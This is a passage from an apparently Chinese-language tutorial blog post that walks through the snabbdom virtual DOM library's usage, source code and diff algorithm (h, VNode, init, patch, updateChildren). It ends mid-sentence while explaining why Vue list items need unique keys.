title="如何使用"></a>如何使用</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// div中放置子元素 h1,p</span><span class="token keyword">import</span> <span class="token punctuation">{</span> h<span class="token punctuation">,</span> init <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'snabbdom'</span><span class="token comment" spellcheck="true">// patch函数，作用对比两个vnode的差异更新到真实DOM</span><span class="token keyword">let</span> patch <span class="token operator">=</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 第一个参数：标签+选择器</span><span class="token comment" spellcheck="true">// 第二个参数：如果是字符串的话就是标签中的内容</span><span class="token keyword">let</span> vnode <span class="token operator">=</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'div#container'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>  <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">,</span> <span class="token string">'Hello Snabbdom'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'这是一个p标签'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">let</span> app <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span><span class="token keyword">let</span> oldVnode <span class="token operator">=</span> <span class="token function">patch</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 两秒之后继续更新</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  vnode <span class="token operator">=</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'div#container'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>    <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">,</span> <span class="token string">'Hello World'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'Hello P'</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token function">patch</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 清空页面元素 -- 错误</span>  <span class="token comment" spellcheck="true">// patch(oldVnode, null)</span>  <span class="token comment" spellcheck="true">// patch(oldVnode, h('!'))</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="snabbdom的模块"><a href="#snabbdom的模块" class="headerlink" title="snabbdom的模块"></a>snabbdom的模块</h3><p><strong>类似于插件机制</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> init<span class="token punctuation">,</span> h <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'snabbdom'</span><span class="token comment" spellcheck="true">// 1. 导入模块</span><span class="token keyword">import</span> style <span class="token keyword">from</span> <span class="token string">'snabbdom/modules/style'</span><span class="token keyword">import</span> eventlisteners <span class="token keyword">from</span> <span class="token string">'snabbdom/modules/eventlisteners'</span><span class="token comment" spellcheck="true">// 2. 注册模块</span><span class="token keyword">let</span> patch <span class="token operator">=</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">[</span>  style<span class="token punctuation">,</span>  eventlisteners<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 使用 h() 函数的第二个参数传入模块需要的数据（对象）</span><span class="token keyword">let</span> vnode <span class="token operator">=</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  style<span class="token punctuation">:</span> <span class="token punctuation">{</span>    backgroundColor<span class="token punctuation">:</span> <span class="token string">'red'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  on<span class="token punctuation">:</span> <span class="token punctuation">{</span>    click<span class="token punctuation">:</span> eventHandler  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>  <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'h1'</span><span class="token punctuation">,</span> <span class="token string">'Hello Snabbdom'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'这是p标签'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">function</span> eventHandler <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'点击我了'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">let</span> app <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span><span class="token keyword">let</span> oldVnode <span class="token operator">=</span> <span class="token function">patch</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span></code></pre><h2 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h2><p>源码地址：<a href="https://github.com/snabbdom/snabbdom" target="_blank" rel="noopener">https://github.com/snabbdom/snabbdom</a></p><h3 id="h函数："><a href="#h函数：" class="headerlink" title="h函数："></a>h函数：</h3><ul><li><code>h</code> 函数主要根据传进来的参数，返回一个 vnode 对象</li></ul><pre class=" language-ts"><code class="language-ts"><span class="token comment" spellcheck="true">// h函数的重载，TS支持</span><span class="token keyword">export</span> <span class="token keyword">function</span> h <span class="token punctuation">(</span>sel<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span><span class="token punctuation">:</span> VNode<span class="token keyword">export</span> <span class="token keyword">function</span> h <span class="token punctuation">(</span>sel<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">,</span> data<span class="token punctuation">:</span> VNodeData <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> VNode<span class="token keyword">export</span> <span class="token keyword">function</span> h <span class="token punctuation">(</span>sel<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> VNodeChildren<span class="token punctuation">)</span><span class="token punctuation">:</span> VNode<span class="token keyword">export</span> <span class="token keyword">function</span> h <span class="token punctuation">(</span>sel<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">,</span> data<span class="token punctuation">:</span> VNodeData <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> VNodeChildren<span class="token punctuation">)</span><span class="token punctuation">:</span> VNode<span class="token keyword">export</span> <span class="token keyword">function</span> h <span class="token punctuation">(</span>sel<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">,</span> b<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">,</span> c<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span><span class="token punctuation">:</span> VNode <span class="token punctuation">{</span>  <span class="token keyword">var</span> data<span class="token punctuation">:</span> VNodeData <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> children<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">,</span> text<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">,</span> i<span class="token punctuation">:</span> <span class="token keyword">number</span>  <span class="token comment" spellcheck="true">// 处理参数，实现重载的机制</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!==</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 处理三个参数的情况</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token comment" spellcheck="true">// 处理两个参数的情况</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">!==</span> undefined <span class="token operator">&amp;&amp;</span> b <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>children <span class="token operator">!==</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 处理 children 中的原始值（string/number）</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 如果 child 是 string/number，创建文本节点</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 如果是 svg ，创建命名空间</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>    sel<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'s'</span> <span class="token operator">&amp;&amp;</span> sel<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'v'</span> <span class="token operator">&amp;&amp;</span> sel<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'g'</span> <span class="token operator">&amp;&amp;</span>    <span class="token punctuation">(</span>sel<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">3</span> <span class="token operator">||</span> sel<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'.'</span> <span class="token operator">||</span> sel<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'#'</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">addNS</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> children<span class="token punctuation">,</span> sel<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 返回vnode</span>  <span class="token keyword">return</span> <span class="token function">vnode</span><span class="token punctuation">(</span>sel<span class="token punctuation">,</span> data<span class="token punctuation">,</span> children<span class="token punctuation">,</span> text<span class="token punctuation">,</span> undefined<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="VNode对象"><a href="#VNode对象" class="headerlink" title="VNode对象"></a>VNode对象</h3><ul><li><p>一个 VNode 就是一个虚拟节点用来描述一个 DOM 元素，如果这个 VNode 有 children 就是Virtual DOM</p></li><li><p>源码位置：src/vnode.ts</p></li></ul><pre class=" language-ts"><code class="language-ts"><span class="token keyword">export</span> type Key <span class="token operator">=</span> <span class="token keyword">string</span> <span class="token operator">|</span> <span class="token keyword">number</span><span class="token comment" spellcheck="true">// 接口</span><span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">VNode</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 选择器  </span>  sel<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token operator">|</span> undefined  <span class="token comment" spellcheck="true">// 节点数据：属性/样式/事件等</span>  data<span class="token punctuation">:</span> VNodeData <span class="token operator">|</span> undefined  <span class="token comment" spellcheck="true">// 子节点</span>  children<span class="token punctuation">:</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span>VNode <span class="token operator">|</span> <span class="token keyword">string</span><span class="token operator">></span> <span class="token operator">|</span> undefined  <span class="token comment" spellcheck="true">// 记录 vnode 对应的真实 DOM</span>  elm<span class="token punctuation">:</span> Node <span class="token operator">|</span> undefined  <span class="token comment" spellcheck="true">// 节点中的内容，和 children 只能互斥</span>  text<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token operator">|</span> undefined  key<span class="token punctuation">:</span> Key <span class="token operator">|</span> undefined<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 实现接口</span><span class="token keyword">export</span> <span class="token keyword">function</span> vnode <span class="token punctuation">(</span>sel<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token operator">|</span> undefined<span class="token punctuation">,</span>  data<span class="token punctuation">:</span> <span class="token keyword">any</span> <span class="token operator">|</span> undefined<span class="token punctuation">,</span>  children<span class="token punctuation">:</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span>VNode <span class="token operator">|</span> <span class="token keyword">string</span><span class="token operator">></span> <span class="token operator">|</span> undefined<span class="token punctuation">,</span>  text<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token operator">|</span> undefined<span class="token punctuation">,</span>  elm<span class="token punctuation">:</span> Element <span class="token operator">|</span> Text <span class="token operator">|</span> undefined<span class="token punctuation">)</span><span class="token punctuation">:</span> VNode <span class="token punctuation">{</span>  <span class="token keyword">const</span> key <span class="token operator">=</span> data <span class="token operator">===</span> undefined <span class="token operator">?</span> undefined <span class="token punctuation">:</span> data<span class="token punctuation">.</span>key  <span class="token comment" spellcheck="true">// 使用js对象描述DOM</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span> sel<span class="token punctuation">,</span> data<span class="token punctuation">,</span> children<span class="token punctuation">,</span> text<span class="token punctuation">,</span> elm<span class="token punctuation">,</span> key <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="patch过程"><a href="#patch过程" class="headerlink" title="patch过程"></a>patch过程</h3><ul><li>patch(oldVnode, newVnode)</li><li>打补丁，把新节点中变化的内容渲染到真实DOM，最后返回新节点作为下一次处理的旧节点</li><li>对比新旧 VNode 是否相同节点（节点的 key 和 sel 相同）</li><li>如果不是相同节点，删除之前的内容，重新渲染</li><li>如果是相同节点，再判断新的 VNode 是否有 text，如果有并且和旧节点 text 不同，直接更新</li><li>如果新的 VNode 有 children，判断子节点是否有变化，判断子节点的过程使用的就是 diff 算法</li><li>diff 过程只进行同层级比较</li></ul><h3 id="init函数"><a href="#init函数" class="headerlink" title="init函数"></a>init函数</h3><ul><li><p><strong>功能：</strong>init(modules, domApi)，返回 patch() 函数（高阶函数）</p></li><li><p>为什么要使用高阶函数？</p><ul><li><p>因为 patch() 函数在外部会调用多次，每次调用依赖一些参数，比如：modules/domApi/cbs</p></li><li><p>通过高阶函数让 init() 内部形成闭包，返回的 patch() 可以访问到 modules/domApi/cbs，而不需要重新创建</p></li></ul></li><li><p>init() 在返回 patch() 之前，首先收集了所有模块中的钩子函数存储到 cbs 对象中</p></li><li><p>源码位置：src/snabbdom.ts</p></li></ul><pre class=" language-ts"><code class="language-ts"><span class="token comment" spellcheck="true">// 钩子函数</span><span class="token keyword">const</span> hooks<span class="token punctuation">:</span> <span class="token punctuation">(</span>keyof Module<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'create'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">,</span> <span class="token string">'destroy'</span><span class="token punctuation">,</span> <span class="token string">'pre'</span><span class="token punctuation">,</span> <span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 第一个参数是模块，参考上面模块使用的部分</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span>modules<span class="token punctuation">:</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span>Partial<span class="token operator">&lt;</span>Module<span class="token operator">></span><span class="token operator">></span><span class="token punctuation">,</span> domApi<span class="token operator">?</span><span class="token punctuation">:</span> DOMAPI<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">let</span> i<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> j<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> cbs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span> as ModuleHooks<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 初始化 api ，htmlDomApi里是一些原生 DOM api，用于创建真实 DOM</span>    <span class="token comment" spellcheck="true">// 如果想把虚拟 DOM 转化为其他类型时，可以传入第二个参数</span>    <span class="token keyword">const</span> api<span class="token punctuation">:</span> DOMAPI <span class="token operator">=</span> domApi <span class="token operator">!==</span> undefined <span class="token operator">?</span> domApi <span class="token punctuation">:</span> htmlDomApi<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 把传入的所有模块的钩子方法，统一存储到 cbs 对象中 </span>    <span class="token comment" spellcheck="true">// 最终构建的 cbs 对象的形式 cbs = [ create: [fn1, fn2], update: [], ... ] </span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hooks<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// cbs['create'] = [] </span>        cbs<span class="token punctuation">[</span>hooks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> modules<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">// const hook = modules[0]['create'] </span>            <span class="token comment" spellcheck="true">// 每一个模块都会导出钩子函数的方法，例如 attributes.ts 中导出</span>            <span class="token comment" spellcheck="true">// export const attributesModule: Module = </span>            <span class="token comment" spellcheck="true">// { create: updateAttrs, update: updateAttrs }</span>            <span class="token keyword">const</span> hook <span class="token operator">=</span> modules<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>hooks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>hook <span class="token operator">!==</span> undefined<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token punctuation">(</span>cbs<span class="token punctuation">[</span>hooks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> as <span class="token keyword">Array</span><span class="token operator">&lt;</span><span class="token keyword">any</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>hook<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>    …    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">patch</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">:</span> VNode <span class="token operator">|</span> Element<span class="token punctuation">,</span> vnode<span class="token punctuation">:</span> VNode<span class="token punctuation">)</span><span class="token punctuation">:</span> VNode <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="patch函数"><a href="#patch函数" class="headerlink" title="patch函数"></a>patch函数</h3><ul><li><p><strong>功能：</strong></p><ul><li>传入新旧 VNode，对比差异，把差异渲染到 DOM</li><li>返回新的 VNode，作为下一次 patch() 的 oldVnode</li></ul></li><li><p><strong>执行过程：</strong></p><ul><li>如果 oldVnode 和 vnode 相同（key 和 sel 相同）<ul><li>调用 patchVnode()，找节点的差异并更新 DOM</li></ul></li><li>如果 oldVnode 和 vnode 不同，且oldVnode 是 DOM 元素<ul><li>把 DOM 元素转换成 oldVnode</li><li>调用 createElm() 把 vnode 转换为真实 DOM，记录到 vnode.elm</li><li>把刚创建的 DOM 元素插入到 parent 中</li><li>移除老节点</li></ul></li></ul></li></ul><pre class=" language-ts"><code class="language-ts"><span class="token comment" spellcheck="true">// 如果新旧节点是相同节点(key 和 sel 相同) </span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sameVnode</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 找节点的差异并更新 DOM </span>    <span class="token function">patchVnode</span><span class="token punctuation">(</span>oldVnode<span class="token punctuation">,</span> vnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 如果新旧节点不同，vnode 创建对应的 DOM </span>    <span class="token comment" spellcheck="true">// 获取当前的 DOM 元素 </span>    elm <span class="token operator">=</span> oldVnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">;</span>     parent <span class="token operator">=</span> api<span class="token punctuation">.</span><span class="token function">parentNode</span><span class="token punctuation">(</span>elm<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// createElm 是为 VNode 创建真实的 DOM </span>    <span class="token function">createElm</span><span class="token punctuation">(</span>vnode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 如果父节点不为空，把 vnode 对应的 DOM 插入到文档中 </span>        api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parent<span class="token punctuation">,</span> vnode<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">,</span> api<span class="token punctuation">.</span><span class="token function">nextSibling</span><span class="token punctuation">(</span>elm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 移除老节点 </span>        <span class="token function">removeVnodes</span><span class="token punctuation">(</span>parent<span class="token punctuation">,</span> <span class="token punctuation">[</span>oldVnode<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">return</span> vnode<span class="token comment" spellcheck="true">// 当可以比较时，调用 patchVnode 找差异并更新 DOM</span><span class="token comment" spellcheck="true">// 当不值得比较时，新节点直接把老节点整个替换了</span><span class="token comment" spellcheck="true">// 最后会返回 VNode，可以继续进行下一个 patch 过程</span></code></pre><h3 id="patchVnode函数"><a href="#patchVnode函数" class="headerlink" title="patchVnode函数"></a>patchVnode函数</h3><ul><li><p>功能：</p><ul><li>patchVnode(oldVnode, vnode, insertedVnodeQueue)</li><li>对比 oldVnode 和 vnode 的差异，把差异渲染到 DOM</li></ul></li><li><p>执行过程：</p><ul><li><code>if(oldVnode === vnode)</code>则没有变化</li><li><code>if(oldVnode.text !== null &amp;&amp; vnode.text !== null &amp;&amp; oldVnode.text !== vnode.text)</code>，文本节点的比较，需要修改，则会调用<code>Node.textContent = vnode.text</code>。</li><li><code>if(oldVnode.children &amp;&amp; vnode.children)</code>, 两个节点都有子节点，而且它们不一样，这样我们会调用<code>updateChildren</code>函数比较子节点，<strong>这是diff的核心</strong>。</li><li>如果 vnode.children 有值， oldVnode.children 无值<ul><li>清空 DOM 元素</li><li>调用 addVnodes() ，批量添加子节点</li></ul></li><li>如果 oldVnode.children 有值， vnode.children 无值<ul><li>调用 removeVnodes() ，批量移除子节点</li></ul></li></ul></li></ul><h3 id="updateChildren"><a href="#updateChildren" class="headerlink" title="updateChildren"></a><strong>updateChildren</strong></h3><ul><li><p><strong>功能：</strong></p><ul><li>diff 算法的核心，对比新旧节点的 children，更新 DOM</li></ul></li><li><p><strong>执行过程：</strong></p><ul><li>此外可参考：<a href="https://juejin.im/post/6844903607913938951" target="_blank" rel="noopener">https://juejin.im/post/6844903607913938951</a></li><li>在对<strong>开始和结束节点</strong>比较的时候，总共有四种情况<ul><li>oldStartVnode / newStartVnode (旧开始节点 / 新开始节点)</li><li>oldEndVnode / newEndVnode (旧结束节点 / 新结束节点)</li><li>oldStartVnode / oldEndVnode (旧开始节点 / 新结束节点)</li><li>oldEndVnode / newStartVnode (旧结束节点 / 新开始节点)</li></ul></li></ul></li></ul><p><img src="https://s1.ax1x.com/2020/10/09/0rCzTI.png" alt="0rCzTI.png"></p><ul><li><p>开始节点和结束节点比较，这两种情况类似</p><ul><li>oldStartVnode / newStartVnode (旧开始节点 / 新开始节点)</li><li>oldEndVnode / newEndVnode (旧结束节点 / 新结束节点)</li></ul></li><li><p>如果 oldStartVnode 和 newStartVnode 是 sameVnode (key 和 sel 相同)</p><ul><li>调用 patchVnode() 对比和更新节点</li><li>把旧开始和新开始索引往后移动 oldStartIdx++ / oldEndIdx++</li></ul></li></ul><hr><p><img src="https://s1.ax1x.com/2020/10/09/0rPgAI.png" alt="0rPgAI.png"></p><ul><li>oldStartVnode / newEndVnode (旧开始节点 / 新结束节点) 相同<ul><li>调用 patchVnode() 对比和更新节点</li><li>把 oldStartVnode 对应的 DOM 元素，移动到右边<ul><li>更新索引</li></ul></li></ul></li></ul><hr><p><img src="https://s1.ax1x.com/2020/10/09/0ri3PP.png" alt="0ri3PP.png"></p><ul><li>oldEndVnode / newStartVnode (旧结束节点 / 新开始节点) 相同<ul><li>调用 patchVnode() 对比和更新节点</li><li>把 oldEndVnode 对应的 DOM 元素，移动到左边<ul><li>更新索引</li></ul></li></ul></li></ul><hr><ul><li>如果不是以上四种情况<ul><li>遍历新节点，使用 newStartNode 的 key 在老节点数组中找相同节点</li><li>如果没有找到，说明 newStartNode 是新节点<ul><li>创建新节点对应的 DOM 元素，插入到 DOM 树中</li></ul></li><li>如果找到了<ul><li>判断新节点和找到的老节点的 sel 选择器是否相同</li><li>如果不相同，说明节点被修改了<ul><li>重新创建对应的 DOM 元素，插入到 DOM 树中</li></ul></li><li>如果相同，把 elmToMove 对应的 DOM 元素，移动到左边</li></ul></li></ul></li></ul><hr><ul><li>当老节点的所有子节点先遍历完 (oldStartIdx &gt; oldEndIdx)，循环结束<ul><li>说明新节点有剩余，把剩余节点批量插入到右边</li></ul></li></ul><p><img src="https://s1.ax1x.com/2020/10/09/0rFz79.png" alt="0rFz79.png"></p><ul><li>新节点的所有子节点先遍历完 (newStartIdx &gt; newEndIdx)，循环结束<ul><li>说明老节点有剩余，把剩余节点批量删除</li></ul></li></ul><p><img src="https://s1.ax1x.com/2020/10/09/0rkBcT.png" alt="0rkBcT.png"></p><h2 id="关于-V-for-带-key"><a href="#关于-V-for-带-key" class="headerlink" title="关于 V-for 带 key"></a>关于 V-for 带 key</h2><p>参考：<a href="https://juejin.im/post/6844903577215827982" target="_blank" rel="noopener">https://juejin.im/post/6844903577215827982</a></p><p>官方：<a href="https://cn.vuejs.org/v2/api/#key" target="_blank" rel="noopener">https://cn.vuejs.org/v2/api/#key</a></p><p>除了上述所说，更快速 : key 的唯一性可以被 Map 数据结构充分利用,相比于遍历查找的时间复杂度 O(n),Map 的时间复杂度仅仅为 O(1),源码如下:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">createKeyToOldIdx</span><span class="token punctuation">(</span>children<span class="token punctuation">,</span> beginIdx<span class="token punctuation">,</span> endIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> i<span class="token punctuation">,</span> key<span class="token punctuation">;</span>  <span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> beginIdx<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> endIdx<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    key <span class="token operator">=</span> children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> map<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="场景：list-三条数据删除中间的那条"><a href="#场景：list-三条数据删除中间的那条" class="headerlink" title="场景：list 三条数据删除中间的那条"></a>场景：list 三条数据删除中间的那条</h2><h4 id="index作为key，错误的删除了第三条"><a href="#index作为key，错误的删除了第三条" class="headerlink" title="index作为key，错误的删除了第三条"></a>index作为key，错误的删除了第三条</h4><blockquote><p>至于为什么，根据 diff 算法，首先生成旧节点和新节点的虚拟 dom , 根据 key 判断是否为相同节点，再去更新内部内容，此时以 index 作为 